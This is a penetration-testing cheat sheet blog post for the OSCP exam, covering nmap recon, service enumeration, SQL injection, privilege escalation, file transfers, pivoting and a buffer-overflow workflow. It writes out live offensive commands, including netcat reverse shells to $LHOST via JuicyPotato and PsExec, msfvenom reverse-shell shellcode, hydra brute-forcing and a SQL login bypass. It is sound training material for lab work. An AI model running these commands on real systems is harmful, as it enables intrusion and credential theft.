+++
title = "OSCP Cheat Sheet and Command Reference"
date = "2020-05-03"
toc = true
type = ["posts","post"]
series = ["CheatSheets"]
tags = [
    "PWK",
    "OSCP",
    "Hacking",
]

[ author ]
  name = "Cas van Cooten"
+++

*Updated **May 18th, 2020***

Since my OSCP certification exam is coming up, I decided to do a writeup of the commands and techniques I have most frequently used in the PWK labs and in similar machines. I aimed for it to be a basic command reference, but in writing it it has grown out to be a bit more than that!

That being said - it is *far from* an exhaustive list. If you feel any important tips, tricks, commands or techniques are missing from this list just get in touch on [Twitter](https://twitter.com/chvancooten)!

## Reconnaissance

### Full TCP nmap

Enumerate ALL ports and services to identify low hanging fruit, and get the full list of services that you need to look into during enumeration.

```
nmap -sV -sC -p- -o nmap.out -vvv $RHOST
```

### UDP nmap

It's always good to check the top UDP ports. OffSec seems to like the "hidden UDP gems" SNMP and TFTP. 

```
nmap -sU --top-ports 20 -o nmap-udp.out -vvv $RHOST
```


## Enumeration

This is an *explicitly non-exhaustive* list of things to try on different services that are identified. In my experience, these are some of the most-used services for PWK, though. Hit me up if you feel anything is missing from this list!

> Rule #1: 👏ENUMERATE👏EVERYTHING👏

### FTP (21/tcp)

Check for anonymous login, try credentials if you have them. Sometimes the FTP server is vulnerable itself - refer to 'Searchsploit'.

### SSH (22/tcp)

Try credentials if you have them. Usually not too exploitable, unless you encounter a really old version. You may encounter scenarios where the private key is [predictable](https://github.com/g0tmi1k/debian-ssh) or you have a public key with [weak crypto](https://github.com/Ganapati/RsaCtfTool).

In some instances, SSH may be an entry point using weak credentials. If you know several possible usernames on the system, try those out with weak credentials, such as the username as the password or common passwords.

```
hydra -l $USERNAME -P /usr/share/wordlists/wfuzz/others/common_pass.txt ssh://$RHOST
```

> Bruteforcing live services beyond short password lists or straightforward guesses (blank password, username as password, etc.) is not necessary and never advisable. If you found a hash, see the section on [hashes and cracking](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#hashes-and-known-credentials).

### SMTP (25/tcp)

You may be able to enumerate usernames through SMTP.

```plaintext
nc 10.11.1.217 25
[...]
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local recipient table
```

### DNS (53/tcp)

In many cases, you can extract some juicy information from a DNS server. Always attempt to do a zone transfer if you know the target domain.

```
dig axfr @$RHOST DOMAIN.COM
dnsrecon -d DOMAIN.COM
```

### RPC / NFS (111/tcp)

RPC is there for a reason, especially on Linux-based machines it may point to NFS.

Enumerate RPC first:

```
nmap -sV -p 111 --script=rpcinfo $RHOST
```

If you find NFS-related services, enumerate those.

```
nmap -p 111 --script nfs* $RHOST
```

If you find NFS shares, mount them and see if you can read/write files or change your permissions by adding a new user with a certain UID. If you can't seem to do anything, *remember the fact that it is there for later*.

```
mount -t nfs -o vers=3 $RHOST:/SHARENAME /mnt

groupadd --gid 1337 pwn
useradd --uid 1337 -g pwn pwn
```

### S(a)MB(a) (139/tcp and 445/tcp)

Check for 'null sessions' (anonymous login). SMB may be exploitable by e.g. EternalBlue, so carefully check version and OS numbers. For any Windows-based system that exposes port `139` and/or `445`, it is worth running `enum4linux` to perhaps enumerate users on the machine or gain other information.

If you are authenticated and have a writable share, you may be able to [traverse to the root directory](https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal) if it is Samba (linux).

### SNMP (161/udp)
For any UDP port, it's worth verifying if the port is actually open by also running a service and script scan. This increases the odds that nmap is able to verify the service.

```
sudo nmap -sU -sV -sC --open -p 161 $RHOST
```

If SNMP is running, try extracting information using common community strings. Various tools can help in dumping the data in a readable format.

```
snmp-check $RHOST
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $RHOST
snmpwalk -v1 -c public $RHOST
```

### HTTP(S) (80/tcp, 443/tcp, 8000/tcp, 8080/tcp, 8443/tcp, ...)

Any ports with a webserver require close enumeration and a high degree of manual inspection. Below are a couple of helpful tools and commands for initial enumeration, but make sure to go through the webpages yourself and review the functionality, parameters in web requests, etc. Use tools such as BurpSuite to play with interesting requests.

It is worth noting that there are several web services and systems that you will be encountering often. Familiarize yourself with systems such as Tomcat or XAMPP, as you will encounter situations where you will have to identify these systems and know to a basic extent how they work.

#### Gobuster

**Extensions**

Adapt the extensions (`-x`) to the web technology and platform (e.g. `.html,.php` for Linux, `.html,.asp,.aspx` for Windows). If you have a hint or hunch that other files may be stored on the webserver or in that specific subdirectory, include those. Suggestions are `.txt,.php.bak,.old` etcetera.

**Wordlist**

Adapt the wordlist to the specific platform, if applicable. Don't forget about specialized wordlists (e.g. for [Wordpress](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt) or [Sharepoint](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt)).

```
gobuster dir -u $RHOST -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html -o gobuster.out
```

#### Nikto

Always run Nikto to identify quick wins (hopefully), and gain more insight in the technology stack behind the webpage.

```
nikto -h $RHOST -o nikto-out.txt
```

#### SSLScan

May identify some interesting features from the SSL certificate or SSL-based vulnerabilities (Heartbleed) on SSL-enabled services.

```
sslscan $RHOST
```

### Searchsploit

Search for every service / software version that you manage to identify. Try different combinations of the name and version number of the software. Sometimes I have better results just using Google or the exploit-db search function instead.

### All-in-one

Don't depend on it too much, but [AutoRecon](https://github.com/Tib3rius/AutoRecon) is an excellent tool that runs the most common reconnaissance and enumeration steps in one multithreaded process. Output is dumped to a subfolder per target, giving you a clear overview of possible attack vectors.


## Exploitation

It's quite difficult to summarize the steps required for exploitation throughout PWK, since so many different vectors may be involved. If you've done your enumeration well, chances are this phase simply entails downloading an exploit from Exploit-DB, modifying it, and running it to get a (low-privileged) shell. However, you may also have to jump several hurdles before you get to that point, or exploit systems manually altogether. 

Below are some of of the things that came to mind at the time of writing. Again - if you have any additions please let me know!

### Directory Traversal and (Local) File Inclusion

You'll likely encounter these in web systems, but possible also as a known vulnerability in other systems such as FTP servers. There are several questions you should ask yourself when this happens.

**What type of inclusion am I dealing with?**

If you don't yet know, identify whether you are dealing with a remote or local file inclusion (code gets executed, great!) or 'simply' a traversal vulnerability. In general, I'd say `RFI > LFI > Traversal` in terms of exploitability. The first two will likely allow you to execute arbitrary code, which should be enough to net you a shell in most instances (at least for PWK).

**What can I read?**

If you can 'only' read files, think about what it is you can read to gain a foothold on the machine, or at least progress in your exploitation. First, try and see if you happen to have privileged read access and can read for example `/etc/shadow` or `C:\Users\Administrator\Desktop\Proof.txt`. It's a long shot, but it happens. On Windows, don't forget about the `SAM`, `SECURITY`, and `SYSTEM` files and their backups. Those can sometimes get you straight to `SYSTEM` as well.

If you have limited read access (which will be the majority of times), think about the user context you have read access and juicy files that you can access as them (private SSH keys in user folders, database configuration files in web folders, etc.). Also think about the services you have enumerated on the box, which config files do they have that may be interesting (plaintext credentials, anyone)?

If all else fails, take to online cheat sheets like [this one](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/) for inspiration and just blast ahead 🕵.️

### SQL Injection

You will most definitely encounter SQL Injections during PWK. Injections are usually not too complex and should be exploitable manually - so try to avoid `SQLMap` wherever possible. Make sure you at least have a basic understanding of the SQL syntax that is involved and what is actually going on under the hood, it will make your life a whole lot simpler!

Injections range from simple login bypasses to `UNION` inclusion queries. They should usually be easily identifiable if you make a habit of fuzzing random symbols (mainly `'`) in every parameter you see. For (custom) login screens, always try `admin`:`' OR '1'='1` and similar queries to see if you get logged in or at least get an unexpected response back.

### Other Web-Based Exploits

You will encounter other web-based attacks in the PWK labs. Expect to encounter attacks that are common in the OWASP Top 10, such as XSS (especially in relation to client-side exploits) and Command Injection. In general, recognizing the attack points for these types of attacks and having a basic understanding of how they work should be enough to get started. In some cases you will have to get creative with some filter bypasses, but the payloads will never be very advanced.

Another attack that is prevalent with web systems in PWK is uploading (web)shells through write access on the webserver. This takes various forms in the labs, such as admin panels, SQL/command injection, WebDAV access (use `cadaver`!), or writable FTP/SMB shares which are served via the web server. In these instances, it's a valuable skill to be able to effectively identify the web technology (PHP, ASP(X), etc.) and have a webshell at hand that you can upload (try Kali's `/usr/share/webshells` directory).

> Personally, I found it to be more effective to upload a *basic* webshell first and then use that to spawn a new reverse shell. In many cases, if you try to upload a php or asp reverse shell, it will break due to compatibility or encoding issues. This issue hasn't occurred for me when using webshells.

### Hashes and (Known) Credentials

As mentioned earlier, pure brute forcing is never the answer to anything for PWK. That being said, you will have to crack hashes and sometimes spray passwords at systems to gain a foothold.

**Hashes**
Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (NT)LM) and are as such easy to look up using a tool like [CrackStation](https://crackstation.net/). In some instances, you will have to use John the Ripper or Hashcat to crack some salted hashes. Note that these cases will usually be obvious: if you find hashes that use a very strong algorithm (e.g. `$6$` SHA512-crypted hashes on Linux) cracking will likely not get you anywhere. 

**Bruteforcing**

Though you won't have to brute force logins in the traditional sense of the word, you will sometimes have to make educated guesses to gain access to a system. As mentioned in the enumeration section above, tools like Hydra or BurpSuite will help in this. Again, only go for the top ranking passwords in common wordlists and other common options such as `username:username`. If you don't hit a password within 5 minutes, you're looking in the wrong direction.

**Password spraying**

One of the fun -and frustrating- factors in the PWK labs is the inter-relation between machines. I would strongly recommend keeping an elaborate master-password list of all the passwords and Windows hashes you found, so that you can occasionally use those to see if passwords are re-used anywhere. Tools like Hydra, CrackMapExec, or Metasploit can be used to do this effectively.


## Privilege Escalation

Privilege escalation is entirely different for Windows and Linux systems. In general, it pays to have an eye for detail and a large arsenal of tools that can help enumerate and exploit. 

> Again, don't forget to 👏ENUMERATE👏EVERYTHING👏

### Windows

I generally check my permissions (`whoami /all`) and the filesystem (`tree /f /a` from the `C:\Users` directory) for quick wins or interesting files (especially user home folder and/or web directories). If I don't find anything, I then run a tool like `winPEAS.exe` (from [here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)) to identify any vulnerabilities. Things to look for in enumeration results:

- Default credentials, try them to pivot to other users.
- Open ports, are there any services that are listening on 127.0.0.1 only? Look for exploits.
- Running software, what is non-default? Look for exploits.
- Unquoted service paths, do they exist? Could you write a malicious binary and restart affected services?
- Modifiable service binaries, do they exist? Do they run as `SYSTEM` or an admin user?

If nothing obvious comes out of `WinPEAS`, I usually run `Invoke-AllChecks` from [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc), which does similar checks but sometimes also catches additional vulnerabilities.

If all else fails I start looking for OS-level exploits, especially on older systems. [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) helps for this: you can run it from Kali and only need the output of `SystemInfo`. It also helps to sometimes google for privilege escalation vulnerabilities for the exact OS version - an interesting example I used once for PWK is [ComaHawk](https://github.com/apt69/COMahawk) (works on relatively recent Windows 10 systems).

Some other notable examples are discussed in the sections below.

#### JuicyPotato

Relevant if you have the `SeImpersonatePrivilege` and the OS version is *older than* Server 2019 or Windows 10. I've had the biggest successes by using a neutral binary such as `nc.exe` or `nc64.exe` from [here](https://eternallybored.org/misc/netcat/). If you create a `bat` file with the command call, it should evade most AV and give you a privileged shell. 

Grab a CLSID from [here](https://ohpe.it/juicy-potato/CLSID/), it may take a couple of different attempts to get a working CLSID.

```cmd
# On target system, after copying required binaries
echo C:\temp\nc64.exe -e cmd.exe $LHOST 443 > rev.bat
.\JuicyPotato.exe -l 1337 -p C:\temp\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

> Alternatives to the above are available. Play with tools like [LovelyPotato](https://github.com/TsukiCTF/Lovely-Potato) as well, which automate the finding of the CLSID.

#### UAC Bypass

Relevant if you are a local administrator, but `whoami /all` returns that you are running in a "Medium integrity process". The method of exploitation differs widely per OS version. Googling for automated UAC bypass exploits for a specific version, or using [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) or metasploit to ID possible UAC bypass vulnerabilities is likely to have success.

#### Local Admin to SYSTEM

Even though this is strictly not required for PWK or the OSCP certification exam, I always like to get a full `SYSTEM` shell. We can realize this with `PsExec.exe` (from [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)). You can use a Msfvenom executable instead of `rev.bat`, but the latter works better for AV evasion (see `JuicyPotato`).

```plaintext
.\PsExec.exe -i -s "c:\temp\rev.bat"
```

> If you have a shell on a Windows system and a password for another user, PsExec can also be used to execute programs as the target user.
> ```
> .\PsExec.exe -user $USERNAME -p $PASSWORD "c:\temp\rev.bat"
> ```

### Linux

For Linux PrivEsc, I usually run `sudo -l`. If this results in certain commands that we can run (without a password or with a known password), I'd bet ya that this is your vector. After that, I start looking at the filesystem (again - home directories and interesting directories like `/var/www/html`) for juicy files or files that contain credentials or clues. Often, this may result in e.g. MySQL credentials that we can use to dump the DB locally. Finally, I look at interesting and/or non-default groups we are in through `id`.

After that, I usually automate PrivEsc enumeration through [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) or in some cases [LinEnum](https://github.com/rebootuser/LinEnum). However, I strongly advice everyone to get familiar with the commands that these scripts execute and what they imply. [This](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) is an excellent reference of commands that help in getting situational awareness and identifying vulnerabilities manually. Also, I like the high level questions posed [here](https://github.com/frizb/Linux-Privilege-Escalation/blob/master/README.md) - Who am I? What can I read, write, or execute? Some of the questions you have to answer for effective privilege escalation in Linux are similar to Windows, some are entirely different. In general, below are some questions that are often relevant.

- Are any services or programs running that seem non-default? Are they vulnerable?
	- Pay special attention to services running as the root user (`ps auxww | grep root`) - in many cases these may be your path to root. E.g., is MySQL running as root? Run [raptor_udf2](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c).
- Which services are listening only locally? Are they vulnerable?
- Are permissions on interesting files or folders misconfigured?
- Are there any cronjobs or scheduled tasks in place? Who executes them?
	- Note: If you cannot read cron files try [pSpy](https://github.com/DominicBreuker/pspy) - it may help in identifying interesting recurrently executed commands.
- Can we run `sudo` on default binaries? Check [GTFOBins](https://gtfobins.github.io/) for them. 
- Are any interesting binaries owned by root with SUID or GUID set? Check GTFOBins for them.
- Are there any files with unrestricted POSIX capabilities (just `+ep`), or other interesting capabilities (such as `cap_setuid` or `cap_dac_override`) that we can use for privesc?
- If you identified any binaries running recurrently as root or that we can trigger with `sudo` or in an elevated context: Can we write to that file? Can we hijack the path?

> Note: If you run out of options for elevation to root, consider the fact that you may have to move laterally to another user first.

Again, kernel exploits should be a last resort for PWK privilege escalation. Identifying the kernel version with `uname` and tossing that into searchsploit should be helpful on that front, but be prepared to start struggling with all types of compiling issues! 💀


## File Transfers

There are many tools available for easy file transfers, but these are some of my favorites.

### Windows

For Windows, I almost exclusively run or copy from my SMB share. In some cases it works, in some it doesn't. I always try commands in this order:

1. Impacket-smbserver
	```bash
	impacket-smbserver secure .
	
	# On target system - copy files
	copy \\$LHOST\secure\nc64.exe .
	```

2. Impacket-smbserver (with SMBv2 support)
	Seems to work in some cases, if you get a "not subscriptable" error otherwise.
	```bash
	impacket-smbserver secure . -smb2support
	
	# On target system - spawn shell straight from share
	\\$LHOST\secure\nc64.exe $LHOST $LPORT -e cmd.exe
	```

3. SMB Daemon
	Works most of the time, but is some hassle to set up and doesn't give you NetNTLM hashes as a bonus.
	```bash
	service smbd start
	```

### Linux

I usually use a simple HTTP server from python to `curl` or `wget` files on demand. 

```bash
python3 -m http.server 80 # Starts a web server in the current directory on port 80
```

There are some nice alternatives in case this is not possible. Examples are base64-encoding and netcat.

```bash
cat $FILENAME | base64 #copy output

# On target
echo -n "$BASE64FILE" | base64 -d | bash # run the file in bash
```

```bash
nc -lvnp 443 < $FILENAME

# On target
nc $LHOST 443 > $FILENAME
```

## Pivoting

SSH access always gives you the easiest pivot. You can set up a SOCKS proxy by adding the `-D` flag as follows.

```
ssh $USERNAME@$RHOST -D 1080
```

This opens a SOCKS proxy on your machine's port 1080, which is proxied to the target system. You can configure to use it with `proxychains` quite easily.

Another nice addition to the proxying portfolio is `sshuttle`, it does some magic to automatically proxy traffic from your host to a certain subnet through the target system.

```
sshuttle -r $USERNAME@$RHOST 10.1.1.0/24
```

If you only have Windows systems to deal with, `Chisel` comes highly recommended. It's a bit more complicated to set up a full SOCKS proxy, as it requires two sessions on the target. The required commands are as below.

> On Kali:
> ```
> ./chisel server -p 8000 --reverse
> ```
> 
> On target:
> ```
> .\chisel_windows_386.exe client $LHOST:8000 R:8001:127.0.0.1:9001
> ```
> 
> Now we are listening on localhost:8001 on kali to forward that traffic to target:9001.
> 
> Then, open the Socks server:
> On target:
> ```
> .\chisel_windows_386.exe server -p 9001 --socks5
> ```
> 
> On Kali:
> ```
> ./chisel client localhost:8001 socks
> ```

## Post-exploitation Enumeration

In general, the things you are looking for will stand out quite a bit in the PWK labs. It is nonetheless critical to spend enough time in post-enumeration, as otherwise you will surely miss the entry points of several machines. Very briefly speaking, the things you are looking for are as follow.

- `Proof.txt` files (duh)
- Accounts on the machine (`/etc/passwd` or `hashdump`)
- Credentials in files of several formats (plaintext, KeePass-files, RDP files, etc.)
- Credentials in services (FTP servers, databases)
- Interesting files in home directories
- Activity between multiple machines (ARP tables or `netstat`)

> If you encounter a machine in the PWK labs that references specific names or *any* type of user action, make good note of that and come back to it later. You likely found a hint for a client-side exploit or relation between two machines. 

## Buffer Overflows

Buffer overflows are a skill you definitely have to practice well before your exam. I have included my (*very* basic) command reference below, but I would recommend looking at resources that explain it better. A good overview of the process is provided [here](https://guif.re/bo). The PWK course materials also do a great job explaining the process, and the "Extra Miles" exercises are definitely worth doing.

### Fuzz buffer length

Manually or by using a Python script.

### Find EIP offset

`msf-pattern_create -l [length]`

Find EIP value, then
`msf-pattern_offset -l [length] -q [EIP-query]`

### Determine 'slack space'

Does the exploit code (and prior to that, your list of badchars) fit AFTER `EIP`? Can we reference it there? Alternatively, fit the exploit code and/or list of badchars in the buffer itself.

### Find bad chars

Good [overview](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) provided here. I prefer doing it manually.

### Find suitable memory address

#### Find opcode

Find a suitable instruction
`msf-nasm_shell`

```
nasm > jmp esp
00000000  FFE4              jmp esp
```

> Note: Try `call` if `jmp` is not found!

#### Find address

In Unity debugger with Mona find a module without protections.
`!mona modules`

Then find the addresses to place in `EIP`.
`!mona find -s '\xff\xe4' -m module.dll`

> Note: Mona has some additional, powerful features to find a suitable memory address. You can use for example `!mona jmp -r esp -cpb "BADCHARS"` to find any `JMP ESP` or `CALL ESP`, whilst leaving out addresses with bad characters. Note that Mona returns addresses for all modules by default, so you still have to look at the protections.

Addresses in little endian format, so address `0xabcdef10` becomes `\x10\xef\xcd\xab`.

### Generate shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f py -b '\x00'
```

### Add NOP sled

Just to ensure the payload is referenced correctly.

```python
nopsled = '\x90' * 16
```

### Finalize exploit

At a high level, your buffer becomes something like the following for a simple BoF.

```python
buffer = "A" * 1337 # Identified overflow offset
buffer += "\x10\xef\xcd\xab" # EIP, pointing to your chosen instruction (e.g. JMP ESP)
buffer += "\x90" * 16 # NOP sled
buffer += exploit_code
```